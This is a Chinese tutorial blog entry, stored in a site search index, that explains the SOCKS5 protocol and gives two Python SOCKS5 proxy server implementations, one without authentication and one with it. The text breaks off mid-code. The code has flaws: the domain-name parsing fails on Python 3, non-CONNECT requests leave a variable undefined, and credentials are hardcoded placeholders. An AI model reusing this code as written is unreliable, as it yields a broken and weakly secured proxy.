<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Python编写socks5服务器</title>
      <link href="/2018/04/28/Python%E7%BC%96%E5%86%99socks5%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
      <url>/2018/04/28/Python%E7%BC%96%E5%86%99socks5%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Python编写socks5服务器</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><h2 id="socks协议"><a href="#socks协议" class="headerlink" title="socks协议"></a>socks协议</h2><ul><li>socks是一种网络传输协议，主要用于客户端与外网服务器之间通讯的中间传递。SOCKS是”SOCKetS”的缩写。</li><li>当防火墙后的客户端要访问外部的服务器时，就跟socks代理服务器连接。这个代理服务器控制客户端访问外网的资格，允许的话，就将客户端的请求发往外部的服务器。这个协议最初由David Koblas开发，而后由NEC的Ying-Da Lee将其扩展到版本4。最新协议是版本5，与前一版本相比，增加支持UDP、验证，以及IPv6。根据OSI模型，socks是会话层的协议，位于表示层与传输层之间。</li><li>socks协议的RFC地址：<ul><li><a href="https://www.ietf.org/rfc/rfc1928.txt" target="_blank" rel="external">RFC1928</a></li><li><a href="https://www.ietf.org/rfc/rfc1929.txt" target="_blank" rel="external">RFC1928</a></li></ul></li></ul><h2 id="socks协议使用场景"><a href="#socks协议使用场景" class="headerlink" title="socks协议使用场景"></a>socks协议使用场景</h2><ul><li>socks协议的设计初衷是在保证网络隔离的情况下，提高部分人员的网络访问权限，但是国内似乎很少有组织机构这样使用。一般情况下，大家都会使用更新的网络安全技术来达到相同的目的。</li><li>但是由于socksCap32和PSD这类软件，人们找到了socks协议新的用途：突破网络通信限制，这和该协议的设计初衷正好相反。另外，socks协议也可以用来内网穿透。</li></ul><h2 id="与HTTP代理的对比"><a href="#与HTTP代理的对比" class="headerlink" title="与HTTP代理的对比"></a>与HTTP代理的对比</h2><ul><li>socks支持多种用户身份验证方式和通信加密方式</li><li>socks工作在比HTTP代理更低的层次：socks使用握手协议来通知代理软件其客户端试图进行的连接socks，然后尽可能透明地进行操作，而常规代理可能会解释和重写报头（例如，使用另一种底层协议，例如FTP；然而，HTTP代理只是将HTTP请求转发到所需的HTTP服务器）。虽然HTTP代理有不同的使用模式，CONNECT方法允许转发TCP连接；然而，socks代理还可以转发UDP流量和反向代理，而HTTP代理不能。HTTP代理通常更适合HTTP协议，执行更高层次的过滤（虽然通常只用于GET和POST方法，而不用于CONNECT方法）。socks不管应用层是什么协议，只要是传输层是TCP/UDP协议就可以代理。</li></ul><h2 id="socks5协议详解"><a href="#socks5协议详解" class="headerlink" title="socks5协议详解"></a>socks5协议详解</h2><p><img src="/2018/04/28/Python编写socks5服务器/1.png" alt="1.png"></p><h3 id="协商"><a href="#协商" class="headerlink" title="协商"></a>协商</h3><ul><li>客户端首先向SOCKS服务器自己的协议版本号，以及支持的认证方法。SOCKS服务器向客户端返回协议版本号以及选定的认证方法。格式为：<br><img src="/2018/04/28/Python编写socks5服务器/2.png" alt="2.png"></li><li>各个字段的含义为：    <ul><li>VER：socks版本（在socks5中是<code>X05</code>）</li><li>NMETHODS：在METHODS字段中出现的方法的数目</li><li>METHODS：客户端支持的认证方式列表，每个方法占1字节</li></ul></li><li>服务器端在客户端提供的METHODS域给定的方法中选择一个，然后返回一个方法选择消息：<br><img src="/2018/04/28/Python编写socks5服务器/3.png" alt="3.png"></li><li>各个字段的含义为：    <ul><li>VER：socks版本（在socks5中是<code>X05</code>）</li><li>METHOD：服务端选中的方法（若返回<code>XFF</code>表示没有方法被选中，客户端需要关闭连接）</li></ul></li><li>当前定义的表示方法的值有：<ul><li><code>X00</code> 表示NO AUTHENTICATION REQUIRED(没有认证需求)</li><li><code>X01</code> 表示GSSAPI</li><li><code>X02</code> 表示USERNAME/PASSWORD(用户名/密码)</li><li><code>X03</code> 到 X’7F’表示IANA ASSIGNED(由IANA负责分配）</li><li><code>X80</code> 到 X’FE’为私有方法保留</li><li><code>XFF</code> 表示NO ACCEPTABLE MEHTODS（没有方法被选中）</li></ul></li><li>之后客户端和服务端根据选定的认证方式执行对应的认证。认证结束后客户端就可以发送请求信息（如果认证方法有特殊封装要求，请求必须按照方法所定义的方式进行封装）。</li></ul><h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><ul><li>客户端根据服务器端选定的方法进行认证，如果选定的方法是02,则根据RFC 1929定义的方法进行认证。RFC 1929定义的密码是明文传输，安全性较差。请求格式为：<br><img src="/2018/04/28/Python编写socks5服务器/4.png" alt="4.png"></li><li>各个字段的含义为：<ul><li>VER：表示当前子协议的版本，这里是<code>X01</code></li><li>ULEN：表示UNAME字段的长度</li><li>UNAME：表示用户名字节数据</li><li>PLEN：表示PASSWD字段的长度</li><li>PASSWD：表示密码的字节数据</li></ul></li><li>服务器校验用户名和密码，然后返回下面的响应包：<br><img src="/2018/04/28/Python编写socks5服务器/5.png" alt="5.png"></li><li>各个字段的含义为：    <ul><li>VER：表示当前子协议的版本，这里是<code>X01</code></li><li>STATUS：表示认证结果，如果是<code>X00</code>表示认证成功，其他的结果表示认证失败</li></ul></li></ul><h3 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h3><ul><li>针对所依赖方法的子协商一旦完成，客户端就发送请求细节。如果协商过的方法包含了针对完整性检查或保密性目的的封装，这些请求必须被包装到所依赖的方法的封装中。SOCKS请求按下述格式进行组织：<br><img src="/2018/04/28/Python编写socks5服务器/6.png" alt="6.png"></li><li><p>各个字段的含义为：    </p><ul><li>VER：socks版本（在socks5中是<code>0x05</code>）</li><li>CMD：SOCK的命令码：<ul><li>CONNECT <code>X01</code></li><li>BIND <code>X02</code></li><li>UDP ASSOCIATE <code>X03</code></li></ul></li><li>RSV：保留字段</li><li>ATYP：地址类型：<ul><li>IP V4地址：<code>X01</code></li><li>域名地址：<code>X03</code></li><li>IP V6地址：<code>X04</code></li></ul></li><li>DST.ADDR：目的地址</li><li>DST.PORT：目的端口</li></ul></li><li><p>请求类型有下面几种：</p><ul><li>CONNECT : <code>0X01</code>， 建立代理连接。比较常见的请求，客服端请求服务器发起链接到目标主机，目标端口的代理。SOCKS 服务器将使用目标主机，目标端口, 客户端的源地址和端口号来评估 CONNECT 请求是否通过。成功之后后续流量都会被转发到目标主机的目标端口。</li><li>BIND : <code>0X02</code>，BIND请求被用于要求客户端接受来自服务器连接的协议中。FTP是一个众所周知的例子，它针对命令和状态报告使用主要的“客户端到服务器”的连接，但是用来响应命令（如LS、GET、PUT命令）的数据传输可以使用一条“服务器到客户端”的连接。只有在完成了connnect操作之后才能进行bind操作，bind操作之后，代理服务器会有两次响应, 第一次响应是在创建socket监听完成之后，第二次是在目标机器连接到代理服务器上之后。.建立流程如下：<ul><li>Client随BIND请求，发送其要绑定的地址和端口。</li><li>Server返回其创建的监听端口的地址和端口。</li><li>Server创建的监听端口有连接后，返回该连接的源地址和端口。</li><li>Server端将上述连接中的流量，发送给client的监听端口。</li></ul></li><li>UDP ASSOCIATE : <code>0x03</code>，用于在UDP中继处理中建立一条关联以处理UDP数据报。</li></ul></li><li><p>服务器按以下格式回应客户端的请求：<br><img src="/2018/04/28/Python编写socks5服务器/7.png" alt="7.png"></p></li><li>各个字段的含义为：<ul><li>VER：socks版本（在socks5中是<code>X05</code>）</li><li>REP：应答状态码：<ul><li><code>X00</code> 成功</li><li><code>X01</code> 连接不被规则集允许</li><li><code>X02</code> 普通的SOCKS服务器失败</li><li><code>X03</code> 网络不可达</li><li><code>X04</code> 主机不可达</li><li><code>X05</code> 连接被拒绝</li><li><code>X06</code> TTL超时</li><li><code>X07</code> 命令不被支持</li><li><code>X08</code> 地址类型不被支持</li><li><code>X09</code> 到 <code>XFF</code> 未分配</li></ul></li><li>RSV：保留字段（标记为被保留的域必须被设置为<code>X00</code>）</li><li>ATYP：地址类型：<ul><li>IPV4地址：<code>X01</code></li><li>域名：<code>X03</code></li><li>IPV6地址：<code>X04</code></li></ul></li><li>BND.ADDR：服务器绑定的地址</li><li>BND.PORT：服务器绑定的端口</li></ul></li></ul><h3 id="数据转发"><a href="#数据转发" class="headerlink" title="数据转发"></a>数据转发</h3><ul><li>到了这个阶段基本就是数据转发了，tcp就直接转发，udp还须要做点工作。<ul><li>当一个响应（REP值不为<code>X00</code>）指示失败的时候，SOCKS服务器必须在发送这个响应后立刻断开这条TCP连接。这必须发生在检测到引起失败的原因之后的10秒内。</li><li>如果响应码（REP值为<code>X00</code>）指示成功，而且这次请求是BIND或者CONNECT，那么客户端可以立刻开始数据传输。如果选择的认证方法支持针对完整性、认证或私密性目的封装，要传输的数据应该包装在所依赖的认证方法的封装中。同样地，当针对客户端的响应数据到达SOCKS服务器的时候，服务器也必须根据使用的认证方法来封装数据。</li></ul></li><li>一个基于UDP的客户端必须将它的数据报发送到UDP中继服务器的指定端口——该端口在针对UDP ASSOCIATE的响应中的BND.PORT域指明。如果选择的认证方法提供了针对认证、完整性或私密性目的的封装，数据报必须使用恰当的封装方式进行包装。每一个UDP数据报都随身携带了一个UDP请求头：<br><img src="/2018/04/28/Python编写socks5服务器/8.png" alt="8.png"></li><li>各个字段的含义为：    <ul><li>RSV 保留位，值为<code>X0000</code></li><li>FRAG 当前分片号</li><li>ATYP 下列地址类型之一： <ul><li>IPV4地址：<code>X01</code></li><li>域名：<code>X03</code></li><li>IPV6地址：<code>X04</code></li></ul></li><li>DST.ADDR 目的地址</li><li>DST.PORT 目的端口号</li><li>DATA 用户数据</li></ul></li><li>当一个UDP中继服务器决定中继一个UDP数据报的时候，它会默默的做——不会给客户端返回任何通知。同样的，如果它不能中继数据报那它就会丢弃数据报。当一个UDP中继服务器从远端主机收到一个响应数据报文的时候，它必须根据使用上述的UDP请求头对该响应报文进行封装，然后再进行所依赖的认证方法的封装处理。</li></ul><h2 id="Python-socks5服务器代码实现"><a href="#Python-socks5服务器代码实现" class="headerlink" title="Python socks5服务器代码实现"></a>Python socks5服务器代码实现</h2><ul><li><p>不需要认证的socks5服务器</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div></pre></td><td class="code"><pre><div class="line">import logging</div><div class="line">import select</div><div class="line">import socket</div><div class="line">import struct</div><div class="line">from socketserver import StreamRequestHandler, ThreadingTCPServer</div><div class="line"></div><div class="line">logging.basicConfig(level=logging.DEBUG)</div><div class="line">SOCKS_VERSION = <span class="number">5</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocksProxy</span>(<span class="title">StreamRequestHandler</span>):</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></div><div class="line">        logging.info(<span class="string">'Accepting connection from %s:%s'</span> % <span class="keyword">self</span>.client_address)</div><div class="line"></div><div class="line">        <span class="comment"># 协商</span></div><div class="line">        <span class="comment"># 从客户端读取并解包两个字节的数据</span></div><div class="line">        header = <span class="keyword">self</span>.connection.recv(<span class="number">2</span>)</div><div class="line">        version, nmethods = struct.unpack(<span class="string">"!BB"</span>, header)</div><div class="line"></div><div class="line">        <span class="comment"># 设置socks5协议，METHODS字段的数目大于0</span></div><div class="line">        assert version == SOCKS_VERSION</div><div class="line">        assert nmethods &gt; <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="comment"># 接受支持的方法</span></div><div class="line">        methods = <span class="keyword">self</span>.get_available_methods(nmethods)</div><div class="line"></div><div class="line">        <span class="comment"># 无需认证</span></div><div class="line">        <span class="keyword">if</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> set(methods)<span class="symbol">:</span></div><div class="line">            <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line">        <span class="comment"># 发送协商响应数据包</span></div><div class="line">        <span class="keyword">self</span>.connection.sendall(struct.pack(<span class="string">"!BB"</span>, SOCKS_VERSION, <span class="number">0</span>))</div><div class="line"></div><div class="line">        <span class="comment"># 请求</span></div><div class="line">        version, cmd, <span class="number">_</span>, address_type = struct.unpack(<span class="string">"!BBBB"</span>, <span class="keyword">self</span>.connection.recv(<span class="number">4</span>))</div><div class="line">        assert version == SOCKS_VERSION</div><div class="line"></div><div class="line">        <span class="keyword">if</span> address_type == <span class="number">1</span>:  <span class="comment"># IPv4</span></div><div class="line">            address = socket.inet_ntoa(<span class="keyword">self</span>.connection.recv(<span class="number">4</span>))</div><div class="line">        elif address_type == <span class="number">3</span>:  <span class="comment"># Domain name</span></div><div class="line">            domain_length = ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>)[<span class="number">0</span>])</div><div class="line">            address = <span class="keyword">self</span>.connection.recv(domain_length)</div><div class="line"></div><div class="line">        port = struct.unpack(<span class="string">'!H'</span>, <span class="keyword">self</span>.connection.recv(<span class="number">2</span>))[<span class="number">0</span>]</div><div class="line"></div><div class="line">        <span class="comment"># 响应，只支持CONNECT请求</span></div><div class="line">        <span class="symbol">try:</span></div><div class="line">            <span class="keyword">if</span> cmd == <span class="number">1</span>:  <span class="comment"># CONNECT</span></div><div class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">                remote.connect((address, port))</div><div class="line">                bind_address = remote.getsockname()</div><div class="line">                logging.info(<span class="string">'Connected to %s %s'</span> % (address, port))</div><div class="line">            <span class="symbol">else:</span></div><div class="line">                <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line"></div><div class="line">            addr = struct.unpack(<span class="string">"!I"</span>, socket.inet_aton(bind_address[<span class="number">0</span>]))[<span class="number">0</span>]</div><div class="line">            port = bind_address[<span class="number">1</span>]</div><div class="line">            reply = struct.pack(<span class="string">"!BBBBIH"</span>, SOCKS_VERSION, <span class="number">0</span>, <span class="number">0</span>, address_type,</div><div class="line">                                addr, port)</div><div class="line"></div><div class="line">        except Exception as <span class="symbol">err:</span></div><div class="line">            logging.error(err)</div><div class="line">            <span class="comment"># 响应拒绝连接的错误</span></div><div class="line">            reply = <span class="keyword">self</span>.generate_failed_reply(address_type, <span class="number">5</span>)</div><div class="line"></div><div class="line">        <span class="keyword">self</span>.connection.sendall(reply)</div><div class="line"></div><div class="line">        <span class="comment"># 建立连接成功，开始交换数据</span></div><div class="line">        <span class="keyword">if</span> reply[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> cmd == <span class="number">1</span><span class="symbol">:</span></div><div class="line">            <span class="keyword">self</span>.exchange_loop(<span class="keyword">self</span>.connection, remote)</div><div class="line"></div><div class="line">        <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_available_methods</span><span class="params">(<span class="keyword">self</span>, n)</span></span><span class="symbol">:</span></div><div class="line">        methods = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n)<span class="symbol">:</span></div><div class="line">            methods.append(ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>)))</div><div class="line">        <span class="keyword">return</span> methods</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_failed_reply</span><span class="params">(<span class="keyword">self</span>, address_type, error_number)</span></span><span class="symbol">:</span></div><div class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"!BBBBIH"</span>, SOCKS_VERSION, error_number, <span class="number">0</span>, address_type, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exchange_loop</span><span class="params">(<span class="keyword">self</span>, client, remote)</span></span><span class="symbol">:</span></div><div class="line"></div><div class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></div><div class="line"></div><div class="line">            <span class="comment"># 等待数据</span></div><div class="line">            r, w, e = select.select([client, remote], [], [])</div><div class="line"></div><div class="line">            <span class="keyword">if</span> client <span class="keyword">in</span> <span class="symbol">r:</span></div><div class="line">                data = client.recv(<span class="number">4096</span>)</div><div class="line">                <span class="keyword">if</span> remote.send(data) &lt;= <span class="number">0</span><span class="symbol">:</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line"></div><div class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> <span class="symbol">r:</span></div><div class="line">                data = remote.recv(<span class="number">4096</span>)</div><div class="line">                <span class="keyword">if</span> client.send(data) &lt;= <span class="number">0</span><span class="symbol">:</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">'__main__'</span><span class="symbol">:</span></div><div class="line">    <span class="comment"># 使用socketserver库的多线程服务器ThreadingTCPServer启动代理</span></div><div class="line">    with ThreadingTCPServer((<span class="string">'127.0.0.1'</span>, <span class="number">9011</span>), SocksProxy) as <span class="symbol">server:</span></div><div class="line">        server.serve_forever()</div></pre></td></tr></table></figure></li><li><p>需要认证的socks5服务器</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div></pre></td><td class="code"><pre><div class="line">import logging</div><div class="line">import select</div><div class="line">import socket</div><div class="line">import struct</div><div class="line">from socketserver import StreamRequestHandler, ThreadingTCPServer</div><div class="line"></div><div class="line">logging.basicConfig(level=logging.DEBUG)</div><div class="line">SOCKS_VERSION = <span class="number">5</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocksProxy</span>(<span class="title">StreamRequestHandler</span>):</span></div><div class="line">    username = <span class="string">'username'</span></div><div class="line">    password = <span class="string">'password'</span></div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></div><div class="line">        logging.info(<span class="string">'Accepting connection from %s:%s'</span> % <span class="keyword">self</span>.client_address)</div><div class="line"></div><div class="line">        <span class="comment"># 协商</span></div><div class="line">        <span class="comment"># 从客户端读取并解包两个字节的数据</span></div><div class="line">        header = <span class="keyword">self</span>.connection.recv(<span class="number">2</span>)</div><div class="line">        version, nmethods = struct.unpack(<span class="string">"!BB"</span>, header)</div><div class="line"></div><div class="line">        <span class="comment"># 设置socks5协议，METHODS字段的数目大于0</span></div><div class="line">        assert version == SOCKS_VERSION</div><div class="line">        assert nmethods &gt; <span class="number">0</span></div><div class="line"></div><div class="line">        <span class="comment"># 接受支持的方法</span></div><div class="line">        methods = <span class="keyword">self</span>.get_available_methods(nmethods)</div><div class="line"></div><div class="line">        <span class="comment"># 检查是否支持用户名/密码认证方式，不支持则断开连接</span></div><div class="line">        <span class="keyword">if</span> <span class="number">2</span> <span class="keyword">not</span> <span class="keyword">in</span> set(methods)<span class="symbol">:</span></div><div class="line">            <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line">        <span class="comment"># 发送协商响应数据包</span></div><div class="line">        <span class="keyword">self</span>.connection.sendall(struct.pack(<span class="string">"!BB"</span>, SOCKS_VERSION, <span class="number">2</span>))</div><div class="line"></div><div class="line">        <span class="comment"># 校验用户名和密码</span></div><div class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="keyword">self</span>.verify_credentials()<span class="symbol">:</span></div><div class="line">            <span class="keyword">return</span></div><div class="line"></div><div class="line">        <span class="comment"># 请求</span></div><div class="line">        version, cmd, <span class="number">_</span>, address_type = struct.unpack(<span class="string">"!BBBB"</span>, <span class="keyword">self</span>.connection.recv(<span class="number">4</span>))</div><div class="line">        assert version == SOCKS_VERSION</div><div class="line"></div><div class="line">        <span class="keyword">if</span> address_type == <span class="number">1</span>:  <span class="comment"># IPv4</span></div><div class="line">            address = socket.inet_ntoa(<span class="keyword">self</span>.connection.recv(<span class="number">4</span>))</div><div class="line">        elif address_type == <span class="number">3</span>:  <span class="comment"># 域名</span></div><div class="line">            domain_length = ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>)[<span class="number">0</span>])</div><div class="line">            address = <span class="keyword">self</span>.connection.recv(domain_length)</div><div class="line"></div><div class="line">        port = struct.unpack(<span class="string">'!H'</span>, <span class="keyword">self</span>.connection.recv(<span class="number">2</span>))[<span class="number">0</span>]</div><div class="line"></div><div class="line">        <span class="comment"># 响应，只支持CONNECT请求</span></div><div class="line">        <span class="symbol">try:</span></div><div class="line">            <span class="keyword">if</span> cmd == <span class="number">1</span>:  <span class="comment"># CONNECT</span></div><div class="line">                remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">                remote.connect((address, port))</div><div class="line">                bind_address = remote.getsockname()</div><div class="line">                logging.info(<span class="string">'Connected to %s %s'</span> % (address, port))</div><div class="line">            <span class="symbol">else:</span></div><div class="line">                <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line"></div><div class="line">            addr = struct.unpack(<span class="string">"!I"</span>, socket.inet_aton(bind_address[<span class="number">0</span>]))[<span class="number">0</span>]</div><div class="line">            port = bind_address[<span class="number">1</span>]</div><div class="line">            reply = struct.pack(<span class="string">"!BBBBIH"</span>, SOCKS_VERSION, <span class="number">0</span>, <span class="number">0</span>, address_type, addr, port)</div><div class="line"></div><div class="line">        except Exception as <span class="symbol">err:</span></div><div class="line">            logging.error(err)</div><div class="line">            <span class="comment"># 响应拒绝连接的错误</span></div><div class="line">            reply = <span class="keyword">self</span>.generate_failed_reply(address_type, <span class="number">5</span>)</div><div class="line"></div><div class="line">        <span class="keyword">self</span>.connection.sendall(reply)</div><div class="line"></div><div class="line">        <span class="comment"># 建立连接成功，开始交换数据</span></div><div class="line">        <span class="keyword">if</span> reply[<span class="number">1</span>] == <span class="number">0</span> <span class="keyword">and</span> cmd == <span class="number">1</span><span class="symbol">:</span></div><div class="line">            <span class="keyword">self</span>.exchange_loop(<span class="keyword">self</span>.connection, remote)</div><div class="line"></div><div class="line">        <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_available_methods</span><span class="params">(<span class="keyword">self</span>, n)</span></span><span class="symbol">:</span></div><div class="line">        methods = []</div><div class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(n)<span class="symbol">:</span></div><div class="line">            methods.append(ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>)))</div><div class="line">        <span class="keyword">return</span> methods</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify_credentials</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></div><div class="line">        <span class="string">""</span><span class="string">"校验用户名和密码"</span><span class="string">""</span></div><div class="line">        version = ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>))</div><div class="line">        assert version == <span class="number">1</span></div><div class="line"></div><div class="line">        username_len = ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>))</div><div class="line">        username = <span class="keyword">self</span>.connection.recv(username_len).decode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">        password_len = ord(<span class="keyword">self</span>.connection.recv(<span class="number">1</span>))</div><div class="line">        password = <span class="keyword">self</span>.connection.recv(password_len).decode(<span class="string">'utf-8'</span>)</div><div class="line"></div><div class="line">        <span class="keyword">if</span> username == <span class="keyword">self</span>.username <span class="keyword">and</span> password == <span class="keyword">self</span>.<span class="symbol">password:</span></div><div class="line">            <span class="comment"># 验证成功, status = 0</span></div><div class="line">            response = struct.pack(<span class="string">"!BB"</span>, version, <span class="number">0</span>)</div><div class="line">            <span class="keyword">self</span>.connection.sendall(response)</div><div class="line">            <span class="keyword">return</span> True</div><div class="line"></div><div class="line">        <span class="comment"># 验证失败, status != 0</span></div><div class="line">        response = struct.pack(<span class="string">"!BB"</span>, version, <span class="number">0xFF</span>)</div><div class="line">        <span class="keyword">self</span>.connection.sendall(response)</div><div class="line">        <span class="keyword">self</span>.server.close_request(<span class="keyword">self</span>.request)</div><div class="line">        <span class="keyword">return</span> False</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">generate_failed_reply</span><span class="params">(<span class="keyword">self</span>, address_type, error_number)</span></span><span class="symbol">:</span></div><div class="line">        <span class="keyword">return</span> struct.pack(<span class="string">"!BBBBIH"</span>, SOCKS_VERSION, error_number, <span class="number">0</span>, address_type, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line"></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exchange_loop</span><span class="params">(<span class="keyword">self</span>, client, remote)</span></span><span class="symbol">:</span></div><div class="line"></div><div class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></div><div class="line">            <span class="comment"># 等待数据</span></div><div class="line">            r, w, e = select.select([client, remote], [], [])</div><div class="line"></div><div class="line">            <span class="keyword">if</span> client <span class="keyword">in</span> <span class="symbol">r:</span></div><div class="line">                data = client.recv(<span class="number">4096</span>)</div><div class="line">                <span class="keyword">if</span> remote.send(data) &lt;= <span class="number">0</span><span class="symbol">:</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line"></div><div class="line">            <span class="keyword">if</span> remote <span class="keyword">in</span> <span class="symbol">r:</span></div><div class="line">                data = remote.recv(<span class="number">4096</span>)</div><div class="line">                <span class="keyword">if</span> client.send(data) &lt;= <span class="number">0</span><span class="symbol">:</span></div><div class="line">                    <span class="keyword">break</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span 